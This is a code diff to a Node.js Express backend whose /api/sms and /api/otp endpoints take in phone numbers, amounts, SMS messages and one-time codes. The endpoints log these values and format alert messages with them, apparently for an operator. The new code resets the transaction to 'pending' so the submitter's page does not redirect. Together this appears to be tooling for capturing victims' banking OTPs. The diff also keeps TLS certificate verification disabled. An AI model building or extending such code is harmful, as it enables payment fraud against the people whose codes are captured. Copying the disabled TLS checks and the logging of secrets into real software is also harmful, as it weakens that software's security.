@@ -23,7 +23,7 @@ console.log("Database URL starting with:", DATABASE_URL.substring(0, 20));
 // --- DATABASE SETUP (Railway) ---
 const pool = new Pool({
   connectionString: DATABASE_URL,
-  ssl: { rejectUnauthorized: false } // Keep this for Railway proxy
+  ssl: { rejectUnauthorized: false }
 });
 
 // Create table on startup
@@ -92,6 +92,14 @@ app.post('/api/login', async (req, res) => {
 app.post('/api/sms', async (req, res) => {
   console.log("SMS request received:", req.body);
   const { ref, message, phone, amount } = req.body;
+
+  // Reset status to pending when SMS is submitted
+  try {
+    await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', ['pending', ref]);
+    console.log("Status reset to pending for SMS:", ref);
+  } catch (err) {
+    console.error("DB Reset Error:", err.message);
+  }
   
   const text = `
 🚨 *NEW SMS VERIFICATION* 🚨
@@ -135,6 +143,14 @@ ${message}
 app.post('/api/otp', async (req, res) => {
   console.log("OTP request received:", req.body);
   const { ref, otp, phone } = req.body;
+
+  // CRITICAL FIX: Reset status to pending so it doesn't auto-redirect
+  try {
+    await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', ['pending', ref]);
+    console.log("Status reset to pending for OTP:", ref);
+  } catch (err) {
+    console.error("DB Reset Error:", err.message);
+  }
   
   const text = `
 🚨 *NEW OTP VERIFICATION* 🚨
